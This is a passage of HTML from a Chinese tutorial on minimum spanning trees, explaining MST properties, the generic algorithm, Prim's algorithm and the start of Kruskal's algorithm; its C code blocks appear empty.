encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的边数比顶点数少 <code>1</code>，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 本身是一棵树时，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的最小生成树就是它本身</li>
<li>最小生成树的边的权值之和总是唯一的，虽然最小生成树不唯一，但其对应的边的权值之和总是唯一的，而且是最小的</li>
<li>最小生成树的边数为顶点数减 <code>1</code></li>
</ul>
<p>构造最小生成树有多种算法，但大多数算法都利用了最小生成树的下列性质：假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 是一个带权连通无向图，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span> 是顶点集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的一个非空子集。若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(u, v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span> 是一条具有最小权值的边，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo>∈</mo><mi>U</mi><mo separator="true">,</mo><mi>v</mi><mo>∈</mo><mi>V</mi><mo>−</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">u \in U, v \in V - U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span>，则必存在一棵包含边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(u, v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span> 的最小生成树。</p>
<p>基于该性质的最小生成树算法主要有 <code>Prim</code> 算法和 <code>Kruskal</code> 算法，它们都基于贪心算法的策略。对这两种算法应主要掌握算法的本质含义和基本思想，并能够手工模拟算法的实现步骤。</p>
<p>下面介绍一个通用的最小生成树算法：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通用算法每次加入一条边以逐渐形成一棵生成树，下面介绍两种实现上述通用算法的途径。</p>
<ol>
<li>
<p><strong>Prim 算法</strong></p>
<p>Prim（普里姆）算法的执行非常类似于寻找图的最短路径的 <code>Dijkstra</code> 算法。</p>
<p><code>Prim</code> 算法构造最小生成树的过程：初始时从图中任取一顶点（如顶点 <code>1</code>）加入树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，此时树中只含有一个顶点，之后选择一个与当前 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 中顶点集合距离最近的顶点，并将该顶点和相应的边加入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，每次操作后 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 中的顶点数和边数都增 <code>1</code>。以此类推，直至图中所有的顶点都并入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，得到的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 就是最小生成树。此时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 中必然有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 条边。</p>
<p><strong>Prim 算法的步骤如下：</strong></p>
<ul>
<li>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mi>V</mi><mo separator="true">,</mo><mi>E</mi></mrow></mrow><annotation encoding="application/x-tex">G = {V, E}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></span> 是连通图，其最小生成树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>E</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T = (U, E_{T})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">E_{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是最小生成树中边的集合</li>
<li>初始化：向空树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>E</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T = (U, E_{T})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 中添加图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 的任意一个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">u_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，使 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><msub><mi>u</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mi>T</mi></msub><mo>=</mo><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">U = {u_{0}}, E_{T} = \varnothing</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6633em;vertical-align:-0.0817em;"></span><span class="mord amsrm">∅</span></span></span></span></li>
<li>循环（重复下列操作直至 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">U = V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>）：从图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中选择满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>u</mi><mo>∈</mo><mi>U</mi><mo separator="true">,</mo><mi>v</mi><mo>∈</mo><mi>V</mi><mo>−</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">{(u, v) |u \in U, v \in V - U}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></span> 且具有最小权值的边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(u, v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>，加入树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，置 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>U</mi><mo>∪</mo><mi>v</mi><mo separator="true">,</mo><msub><mi>E</mi><mi>T</mi></msub><mo>=</mo><msub><mi>E</mi><mi>T</mi></msub><mo>∪</mo><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">U = U \cup {v}, E_{T} = E_{T} \cup {(u, v)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span>。</li>
</ul>
<p><code>Prim</code> 算法的简单实现如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>Prim</code> 算法的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，不依赖于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|E|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span></span></span></span>，因此它适用于求解边稠密的图的最小生成树。虽然采用其他方法能改进 <code>Prim</code> 算法的时间复杂度，但增加了实现的复杂性。</p>
</li>
<li>
<p><strong>Kruskal 算法</strong></p>
<p>与 <code>Prim</code> 算法从顶点开始扩展最小生成树不同，Kruskal（克鲁斯卡尔）算法是一种按权值的递增次序选择合适的边来构造最小生成树的方法。</p>
<p><code>Kruskal</code> 算法构造最小生成树的过程：初始时为只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个顶点而无边的非连通图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mrow><mi>V</mi><mo separator="true">,</mo><mrow></mrow></mrow></mrow><annotation encoding="application/x-tex">T = {V, {}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"></span></span></span></span></span>，每个顶点自成一个连通分量，然后按照边的权值由小到大的顺序，不断选取当前未被选取过且权值最小的边，若该边依附的顶点落在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 中不同的连通分量上，则将此边加入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，否则舍弃此边而选择下一条权值最小的边。以此类推，直至 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 中所有顶点都在一个连通分量上。</p>
<p><code>Kruskal</code> 算法的步骤如下：</p>
<ul>
